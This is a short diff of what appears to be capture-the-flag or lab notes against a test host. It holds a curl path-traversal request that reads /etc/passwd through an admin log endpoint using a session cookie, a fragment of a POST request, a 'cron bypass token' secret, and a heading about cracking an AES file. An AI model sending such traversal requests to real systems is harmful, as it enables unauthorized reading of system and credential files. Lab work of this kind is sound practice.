@@ -1,5 +1,3 @@
-eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTDnaA.z7dGsWDtoxQKihGVmQ7ruT0Qeh0
-
 curl -X GET "http://10.129.2.213:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd" \
   -H "Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTDp_Q.zovs3Q2Lg_6o_jM_hFj3h9XcQz0
 
@@ -20,10 +18,6 @@ curl -X POST http://10.129.2.213:8000/apply_visual_transform \
   }'
 
 cron bypass token K7Zg9vB$24NmW!q8xR0p/runL!
-
-
-
-
 
 to crack the found aes file
 ```python
